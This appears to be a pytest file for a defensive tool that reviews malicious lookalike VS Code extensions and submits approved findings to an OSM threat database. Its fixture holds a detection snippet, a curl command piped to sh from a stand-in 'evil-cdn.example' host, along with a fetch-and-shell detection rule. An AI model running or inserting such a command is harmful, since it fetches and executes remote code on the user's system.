"""Approval-gated OSM submission for confirmed VS Code extensions."""

from __future__ import annotations

import json

import pytest
from conftest import utcnow

from git_warden.db import Database
from git_warden.extensions import osm as ext_osm
from git_warden.extensions.openvsx import Extension

FINDING = {"file": "extension/entry_dist/extension.js", "line": 3,
           "category": "download_exec", "rule": "js-exec-fetch-shell",
           "snippet": "exec(`curl -s https://evil-cdn.example/p.sh | sh`)"}
RESULT = {"confirmed": True, "confidence": "auto", "confirming_findings": [FINDING],
          "extension": {"version": "1.0.1", "activation_events": ["*"],
                        "entry_points": ["./dist/extension.js"],
                        "signals": ["extension/startup-activation"]}}


def _ext(registry="vsmarketplace", name="prettier-vscode", ns="prettier-team"):
    e = Extension(namespace=ns, name=name, version="1.0.1", registry=registry,
                  download_url=f"https://{ns}.gallerycdn.vsassets.io/x.vsix")
    e.reasons = ["lookalike of esbenp.prettier-vscode"]
    return e


@pytest.fixture
def db(tmp_path, monkeypatch):
    monkeypatch.setenv("GW_SHARED_INTEL", str(tmp_path / "bus.jsonl"))
    d = Database.open(tmp_path / "x.sqlite")
    d.start_run("ext-1", utcnow())
    d.upsert_extension(_ext(), "ext-1", status="confirmed", confidence="auto", score=9,
                       payload=RESULT)
    d.upsert_extension(_ext("openvsx", "theme", "someone"), "ext-1",
                       status="confirmed", confidence="review", score=4, payload=RESULT)
    yield d
    d.close()


class Client:
    def __init__(self, ext=None):
        self.ext = ext

    def extension(self, ns, name):
        return self.ext if self.ext is not None else _ext()


def _run(db, tmp_path, **kw):
    posted: list[dict] = []
    kw.setdefault("check", lambda ext_id, reg: False)
    kw.setdefault("post", lambda report: posted.append(report) or {"threat_id": "t-1"})
    kw.setdefault("scan", lambda ext_id, url: RESULT)
    kw.setdefault("client_for", lambda reg: Client())
    report = ext_osm.run(db, ledger_path=tmp_path / "ledger.json", sleep=lambda s: None,
                         **kw)
    return report, posted


def test_preview_shows_exact_body_and_posts_nothing(db, tmp_path):
    report, posted = _run(db, tmp_path, dry_run=True)
    assert posted == []
    # Only the AUTO extension is offered; the REVIEW one never is.
    assert report["validated"] == ["vsmarketplace:prettier-team.prettier-vscode"]
    body = report["previews"][0]["report"]
    assert body["report_type"] == "package" and body["registry"] == "vscode"
    assert body["package_name"] == "prettier-team.prettier-vscode"
    assert body["version_info"] == "1.0.1"
    assert "evil-cdn.example" in body["verified_iocs"]
    assert "impersonation" in body["tags"] and "vscode-extension" in body["tags"]
    assert "lookalike of esbenp.prettier-vscode" in body["threat_description"]
    assert "—" not in body["threat_description"] + body["payload_description"]
    md = ext_osm.summary_markdown(report)
    assert "Awaiting approval" in md and "Exact OSM report body" in md


def test_submit_sends_only_the_approved_list_and_records_it(db, tmp_path):
    report, posted = _run(db, tmp_path, dry_run=False,
                          only={"vsmarketplace:prettier-team.prettier-vscode"})
    assert report["sent"] == 1 and len(posted) == 1
    ledger = json.loads((tmp_path / "ledger.json").read_text())
    assert ledger[0]["key"] == "vsmarketplace:prettier-team.prettier-vscode"
    assert ledger[0]["threat_id"] == "t-1"
    # The ledger keeps it from ever being offered or sent again.
    again, posted2 = _run(db, tmp_path, dry_run=True)
    assert again["validated"] == [] and posted2 == []


def test_unapproved_extensions_are_never_sent(db, tmp_path):
    report, posted = _run(db, tmp_path, dry_run=False, only={"openvsx:other.thing"})
    assert report["sent"] == 0 and posted == []


def test_already_in_osm_is_skipped(db, tmp_path):
    report, posted = _run(db, tmp_path, dry_run=False, check=lambda e, r: True,
                          only={"vsmarketplace:prettier-team.prettier-vscode"})
    assert posted == [] and "already reported in OSM" in "".join(report["sections"])


def test_osm_lookup_failure_blocks_the_run(db, tmp_path):
    def broken(ext_id, reg):
        raise ext_osm.OSMPrecheckError("HTTP 500")
    report, posted = _run(db, tmp_path, dry_run=False, check=broken,
                          only={"vsmarketplace:prettier-team.prettier-vscode"})
    assert posted == [] and report["blocked"] == "HTTP 500"
    assert "Run blocked" in ext_osm.summary_markdown(report)


@pytest.mark.parametrize("scan,client,why", [
    (lambda e, u: {**RESULT, "confirmed": False}, Client(), "no longer confirms"),
    (lambda e, u: {**RESULT, "confidence": "review"}, Client(), "not AUTO"),
    (lambda e, u: RESULT, Client(ext=Extension("x", "y")), "no longer published"),
])
def test_revalidation_failures_are_not_sent(db, tmp_path, scan, client, why):
    report, posted = _run(db, tmp_path, dry_run=False, scan=scan,
                          client_for=lambda reg: client,
                          only={"vsmarketplace:prettier-team.prettier-vscode"})
    assert posted == [] and why in "".join(report["sections"])


def test_cli_refuses_to_submit_without_an_approved_list(tmp_path):
    assert ext_osm.main(["--db", str(tmp_path / "none.sqlite")]) == 2


def test_approved_list_rejects_malformed_keys(tmp_path):
    f = tmp_path / "ok.json"
    f.write_text(json.dumps(["vsmarketplace:a.b", "openvsx:c.d", "../etc", "x:y.z", 7]))
    assert ext_osm._read_only_file(f) == {"vsmarketplace:a.b", "openvsx:c.d"}
